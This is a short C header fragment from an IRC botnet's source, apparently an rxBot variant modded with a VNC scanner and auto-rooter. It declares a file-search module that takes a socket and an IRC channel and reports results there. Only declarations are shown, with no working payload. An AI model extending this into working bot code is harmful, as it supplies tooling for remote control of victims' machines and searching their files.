/*

    ri0t r00t b0t by h1t3m of h1t3m.org | h4cky0u.org

     (rxBot MP modded with vnc scanner / auto-r00ter)

*/


#ifndef NO_FINDFILE
typedef struct FFIND
{
	SOCKET sock;
	char chan[MAXCHANLEN];
	char filename[MAX_PATH];
	char dirname[MAX_PATH];
	int threadnum;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} FFIND;

DWORD WINAPI FindFileThread(LPVOID param);
unsigned int FindFile(SOCKET sock, char *chan, BOOL notice, char *filename, char *dirname, unsigned int numfound);
#endif
